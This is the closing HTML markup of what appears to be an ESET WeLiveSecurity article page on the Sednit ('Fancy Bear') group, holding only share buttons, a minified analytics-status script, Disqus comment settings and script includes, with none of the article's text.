				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F12%2F21%2Fsednit-update-fancy-bear-spent-year%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F12%2F21%2Fsednit-update-fancy-bear-spent-year%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F12%2F21%2Fsednit-update-fancy-bear-spent-year%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"105518 https:\/\/ba-infohub-web01-v.hq.eset.com\/?p=105518","disqusShortname":"welivesecurity","disqusTitle":"Sednit update: How Fancy Bear Spent the Year","disqusUrl":"https:\/\/www.welivesecurity.com\/2017\/12\/21\/sednit-update-fancy-bear-spent-year\/","postId":"105518"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>